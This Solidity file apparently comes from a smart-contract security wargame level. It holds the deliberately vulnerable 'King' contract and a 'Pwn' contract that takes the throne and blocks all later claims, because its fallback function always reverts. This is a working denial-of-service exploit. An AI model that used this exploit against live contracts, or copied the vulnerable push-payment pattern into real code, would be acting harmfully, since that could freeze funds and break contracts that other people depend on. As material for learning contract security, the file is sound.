pragma solidity ^0.4.18;

import 'github.com/OpenZeppelin/zeppelin-solidity/contracts/ownership/Ownable.sol';

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}

contract Pwn {
    
    King public originalContract;
    
    constructor(address _address) public {
        originalContract = King(_address);            //address of og contract
    }
    
    function get() public payable{
        originalContract.transfer(msg.value);
    }
    
    function() public payable{
        revert();    //revert throws and refunds gas back to caller -- level can't reclaim the King contract
    }
}